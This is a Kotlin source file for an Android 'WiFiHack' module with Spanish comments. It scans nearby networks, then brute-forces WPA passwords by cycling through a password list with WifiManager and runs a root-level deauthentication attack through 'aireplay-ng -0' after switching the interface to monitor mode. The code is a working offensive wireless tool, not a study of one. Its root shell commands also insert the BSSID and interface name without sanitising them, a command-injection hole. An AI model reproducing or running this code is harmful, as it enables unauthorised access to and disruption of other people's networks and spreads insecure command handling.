package com.industrialble.network

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import com.industrialble.tools.RootChecker
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow

/**
 * Módulo WiFi: escaneo, deauth (root) y fuerza bruta.
 */
class WiFiHack(private val context: Context) {

    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

    data class WiFiNetwork(
        val ssid: String,
        val bssid: String,
        val level: Int,
        val frequency: Int,
        val capabilities: String,
        val encryption: String = "",
        val channel: Int = 0
    )

    /** Devuelve el estado del WiFi */
    fun isWifiEnabled(): Boolean = wifiManager.isWifiEnabled

    /** Escanea redes WiFi disponibles (resultados del último scan) */
    fun getScanResults(): List<WiFiNetwork> {
        if (!wifiManager.isWifiEnabled) return emptyList()
        return try {
            wifiManager.scanResults
                .distinctBy { it.BSSID }
                .map { result ->
                    WiFiNetwork(
                        ssid = result.SSID,
                        bssid = result.BSSID,
                        level = result.level,
                        frequency = result.frequency,
                        capabilities = result.capabilities,
                        encryption = detectEncryption(result),
                        channel = freqToChannel(result.frequency)
                    )
                }
                .sortedByDescending { it.level }
        } catch (_: Exception) { emptyList() }
    }

    /** Inicia un escaneo WiFi y devuelve un Flow que emite cuando hay resultados */
    fun startScanWithFlow(): Flow<List<WiFiNetwork>> = callbackFlow {
        if (!wifiManager.isWifiEnabled) {
            trySend(emptyList())
            close()
            return@callbackFlow
        }

        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                    ctx.unregisterReceiver(this)
                    val networks = getScanResults()
                    trySend(networks)
                    close()
                }
            }
        }

        context.registerReceiver(
            receiver,
            IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        )

        // Timeout de 15 segundos
        val success = wifiManager.startScan()
        if (!success) {
            context.unregisterReceiver(receiver)
            trySend(emptyList())
            close()
        }

        awaitClose {
            try { context.unregisterReceiver(receiver) } catch (_: Exception) {}
        }
    }

    /** Devuelve las redes guardadas en el dispositivo */
    fun getSavedNetworks(): List<String> {
        return try {
            wifiManager.configuredNetworks.map { it.SSID }
        } catch (_: Exception) { emptyList() }
    }

    @Suppress("DEPRECATION")
    fun bruteForce(
        ssid: String,
        passwords: List<String>,
        onProgress: (Int, Int, String) -> Unit,
        onFound: (String) -> Unit,
        onFinish: (Boolean) -> Unit
    ) {
        Thread {
            val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""
            for ((index, password) in passwords.withIndex()) {
                onProgress(index + 1, passwords.size, password)
                try {
                    val config = WifiConfiguration().apply {
                        SSID = cleanSsid
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                        if (password.isNotEmpty()) {
                            preSharedKey = "\"$password\""
                            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                        }
                    }
                    val netId = wifiManager.addNetwork(config)
                    if (netId != -1) {
                        wifiManager.disconnect()
                        val enabled = wifiManager.enableNetwork(netId, true)
                        if (enabled) {
                            Thread.sleep(2000)
                            val info = wifiManager.connectionInfo
                            if (info != null && info.ssid == cleanSsid && info.networkId == netId) {
                                onFound(password); onFinish(true); return@Thread
                            }
                        }
                        wifiManager.removeNetwork(netId)
                        wifiManager.saveConfiguration()
                        wifiManager.reconnect()
                    }
                } catch (_: Exception) {}
            }
            onFinish(false)
        }.start()
    }

    fun deauthAttack(bssid: String, interfaceName: String = "wlan0", onLog: (String) -> Unit) {
        Thread {
            onLog("🔴 Verificando root...")
            val root = RootChecker.check(context)
            if (!root.isRooted) { onLog("❌ Se requiere root"); return@Thread }
            onLog("📡 Preparando interfaz $interfaceName...")
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type monitor")
            RootChecker.execRootCommand("ip link set $interfaceName up")
            onLog("⚠️ Enviando deauth a $bssid...")
            RootChecker.execRootCommand("aireplay-ng -0 5 -a $bssid $interfaceName")
            onLog("🔧 Restaurando...")
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type managed")
            RootChecker.execRootCommand("ip link set $interfaceName up")
            onLog("✅ Deauth completado")
        }.start()
    }

    private fun detectEncryption(result: ScanResult): String {
        val cap = result.capabilities
        return when {
            cap.contains("WPA3") -> "WPA3"
            cap.contains("WPA2") -> "WPA2"
            cap.contains("WPA") -> "WPA"
            cap.contains("WEP") -> "WEP"
            else -> "Abierta"
        }
    }

    private fun freqToChannel(freq: Int): Int = when {
        freq in 2412..2484 -> (freq - 2412) / 5 + 1
        freq in 5170..5825 -> (freq - 5170) / 5 + 34
        else -> 0
    }
}
